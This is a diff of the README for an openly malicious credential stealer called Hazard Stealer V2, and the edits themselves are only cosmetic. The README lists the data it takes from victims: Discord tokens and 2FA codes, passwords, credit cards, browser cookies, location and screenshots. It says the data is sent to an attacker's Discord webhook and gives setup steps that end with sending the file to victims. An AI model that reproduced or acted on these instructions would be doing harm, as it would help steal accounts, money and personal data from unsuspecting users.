@@ -6,7 +6,7 @@
 </p>
 
 ## ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ 🌟 Star this Repository if you enjoy Hazard Stealer V2!
-**NOTE:** This is a free software. It will not be undetected from antivirus software, or have custom features. Remember, this is 100% free. If you want a better one, join [CheatAway](https://cheataway.com/) and purchase one.
+**NOTE:** This is a free software. It will not be undetected from antivirus software, or have custom features. Remember, this is 100% free. If you want a better one, join [CheatAway](https://cheataway.com) and purchase one.
 
 ---
 
@@ -20,16 +20,16 @@ Love ❌ code ✅
 -  IP & Geolocation. (Country, City, Google Maps Location)
 -  A screenshot taken when they ran the file.
 -  Roblox Cookies.
--  All valid/working discord tokens. (Bypasses BetterDiscord, Token Protector and Discord's new encryption)
+-  All valid/working Discord tokens. (Bypasses BetterDiscord, Token Protector and Discord's new encryption)
 -  Discord 2FA Codes for accounts with 2FA enabled.
--  Their Passwords & Credit Cards for Discord. (updates when they change it)
+-  Their Passwords & Credit Cards for Discord. (Updates when they change it)
 -  All Passwords and Cookies from the Chrome Browser.
 > The webhook notification looks like this:
-<p align="left"><img src="https://user-images.githubusercontent.com/80375661/159514536-d8249923-adbe-4b9e-a187-6b028941f4a7.png"</p>
+<p align="left"><img src="https://user-images.githubusercontent.com/80375661/159514536-d8249923-adbe-4b9e-a187-6b028941f4a7.png"></p>
  
 ### 📁・Setting up Hazard Token Grabber.V2
-1. Install python if you have not already. [(Link Here)](https://www.python.org/)
-2. Replace "WEBHOOK_HERE" with a discord webhook you've created. (Keep the quotes around the webhook)
+1. Install python if you have not already. [(Link Here)](https://www.python.org)
+2. Replace "WEBHOOK_HERE" with a Discord webhook you've created. (Keep the quotes around the webhook)
 3. Double Click `setup.bat` and allow it to finish.
 4. A Window will open prompting for a name. Put something in such as "Token_Logger" (You can always rename the file later)
 5. Send the file to victims. 😈
